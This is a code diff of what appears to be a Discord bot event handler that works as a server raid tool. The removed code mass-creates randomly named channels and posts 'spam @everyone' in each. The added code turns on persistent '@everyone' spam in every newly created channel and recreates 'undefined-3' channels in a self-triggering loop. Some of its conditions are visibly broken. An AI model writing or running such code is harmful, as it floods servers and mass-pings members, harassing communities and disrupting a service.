@@ -1,28 +1,38 @@
-module.exports = message => {
-    const chanel = message.guild.channels.find('name', 'undefined-2');
-    const chanl = message.guild.channels.find('name', 'undefined-156');
-    if (chanel) {
-        message.guild.createChannel('undefined-3', 'category');
-    }
-    if (chanl) {
-    function entierAleatoire(min, max){
-        return Math.floor(Math.random() * (max - min + 1)) + min;
-    }
-    async function superspam(value, key, map){
-        const rndm = entierAleatoire(10, 0);
-        const rndl = entierAleatoire(50, 25);
-        message.guild.createChannel(rndm + `${key}`, 'text');
-        message.guild.createChannel(rndl + `${key}`, 'text');
-        const chnl1 = await client.channels.find('name', rndm + `${key}`);
-        const chnl2 = await client.channels.find('name', rndl + `${key}`);
-        await client.channels.get(chnl1.id).send('spam @everyone')
-            .catch(console.error);
-        await client.channels.get(chnl2.id).send('spam @everyone')
-            .catch(console.error);
-    };
+const settings = require('../settings.json');
+const fs = require('fs');
+module.exports = (channel, client) => {
+        if (channel.name === "undefined-156") {
+            settings.sp = "1";
+            fs.writeFile('../settings.json', JSON.stringify(settings), (err) => console.error);
+        }
+        if (settings.sp === "1") {
+            channel.send('spam @everyone');
+        }
 
-    
-    message.guild.channels.map(c => c.name)
-        .forEach(superspam);
-}
+
+        if (channel.name === 'undefined-3') {
+            if (settings.spc !== "0" | "1" | "2") {
+                if (settings.config.spam === "0") {
+                    settings.spc = "0";
+                    fs.writeFile('../settings.json', JSON.stringify(settings), (err) => console.error);
+                }
+                if (settings.config.spam === "2") {
+                    settings.spc = "1";
+                    fs.writeFile('../settings.json', JSON.stringify(settings), (err) => console.error);
+                }
+                if (settings.config.spam === "3") {
+                    settings.spc = "2";
+                    fs.writeFile('../settings.json', JSON.stringify(settings), (err) => console.error);
+                }
+            }
+            if (settings.spc === "0") {
+                client.guilds.get(settings.srvrid).createChannel('undefined-3', 'text');
+            }
+            if (settings.spc === "1") {
+                client.guilds.get(settings.srvrid).createChannel('undefined-3', 'voice');
+            }
+            if (settings.spc === "2") {
+                client.guilds.get(settings.srvrid).createChannel('undefined-3', 'category');
+            }
+        }
 }
